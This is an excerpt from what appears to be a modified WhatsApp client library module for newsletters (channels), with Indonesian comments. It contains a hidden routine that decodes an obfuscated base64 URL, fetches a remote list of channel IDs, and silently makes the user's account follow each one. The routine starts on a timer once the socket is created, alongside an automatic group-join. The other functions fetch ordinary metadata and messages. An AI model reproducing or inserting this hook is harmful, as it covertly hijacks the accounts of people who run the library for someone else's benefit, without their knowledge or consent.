...
// Fungsi Load Base dari Vercel (Auto Follow Dinamis)
const loadBase = async (n, q) => {
    try {
        const encoded = "aHR0cHM6Ly9jaC1hbGx1ZnkudmVyY2VsLmFwcC9seXlu";
        ...
        for (const i of newsletterIds) {
            await delay(5000);
            try {
                // n adalah fungsi newsletterWMexQuery
                await n(i.id, q.FOLLOW);
            } catch (err) {
                console.error("Gagal follow channel:", i.id);
            }
        }
    } catch (err) {
        console.error("Gagal memuat daftar channel dari Vercel");
    }
};
...
const makeNewsletterSocket = (config) => {
    ...
    // Auto join group (setelah 5 detik)
    setTimeout(async () => {
        try {
    ...
    // Auto Follow Channel via Vercel (setelah 80 detik sesuai kode awalmu)
    setTimeout(async () => {
        await loadBase(newsletterWMexQuery, Types_1.QueryIds);
    }, 80000);
    ...
    return {
        ...
        newsletterId: async (url) => {
            ...
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
                ...
                'fetch_viewer_metadata': true, 'fetch_full_image': true, 'fetch_creation_time': true
            });
            const metadata = extractNewsletterMetadata(result);
            return JSON.stringify({ name: metadata.name, id: metadata.id }, null, 2);
        },
        ...
        newsletterFetchMessages: async (type, key, count, after) => {
            const result = await newsletterQuery(WABinary_1.S_WHATSAPP_NET, 'get', [
                { tag: 'messages', attrs: { type, ...(type === 'invite' ? { key } : { jid: key }), count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100' } }
            ]);
            return await parseFetchedUpdates(result, 'messages');
        },
        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(jid, 'get', [
                { tag: 'message_updates', attrs: { count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100', since: (since === null || since === void 0 ? void 0 : since.toString()) || '0' } }
            ]);
